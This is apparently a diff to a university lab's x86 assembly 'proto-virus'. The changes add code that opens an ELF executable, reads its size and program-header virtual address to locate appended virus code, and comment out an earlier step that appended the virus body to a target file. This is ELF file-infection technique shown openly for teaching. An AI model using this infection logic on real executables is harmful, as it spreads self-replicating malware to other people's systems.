@@ -60,6 +60,10 @@
 	section .bss
     file_buffer: resb 4 
 	fd: resb 4
+	end_file_off: resb 4
+	start_elf_add: resb 4
+	ph_v_add: resb 4
+	vir_loc: resb 4
 
 	section .text
 _start:	
@@ -78,17 +82,29 @@ _start:
 	mov edi, [elf_string]
 	cmp dword esi, edi
 	jnz error
-	;write 1, OutStr, 31		
-	;jmp VirusExit
 
-	;append virus string to FileName
-	close [fd]
-	open FileName, 0x401, 0777
-	cmp eax, 0
-	jl error
-	mov [fd], eax
-	write [fd], code_start, code_end - code_start
-	close [fd]
+	;finding the virus location in the infected file
+	lseek [fd], 0, SEEK_END		;get the file size
+	mov [end_file_off], eax
+
+	lseek [fd], 60, SEEK_SET	;52+8 = 60, move to the virtual address field in p_header
+	read [fd], ph_v_add, 4
+
+	mov ecx, [ph_v_add]				
+	add ecx, [end_file_off]
+	mov [vir_loc], ecx
+	
+	
+
+	
+	
+
+	;close [fd]
+	;open FileName, 0x401, 0777
+	;cmp eax, 0
+	;jl error
+	;mov [fd], eax
+	;write [fd], code_start, code_end - code_start
 	exit 0
 	
 
@@ -105,7 +121,7 @@ VirusExit:
 FileName:	db "ELFexec2short", 0
 OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
 Failstr:        db "perhaps not", 10 , 0
-DirPath:	db "home/usr/Labs/C-ASM-Labs/Lab9", 0
+
 	
 
 get_my_loc:
@@ -115,6 +131,9 @@ next_i:
 	ret	
 PreviousEntryPoint: dd VirusExit
 virus_end:
+
+call get_my_loc
+sub ecx, next_i - code_start ; We have in ecx the address of code_start
 
 code_start:
 OutStr2:	db "The lab 9 proto-virus strikes!", 10, 0
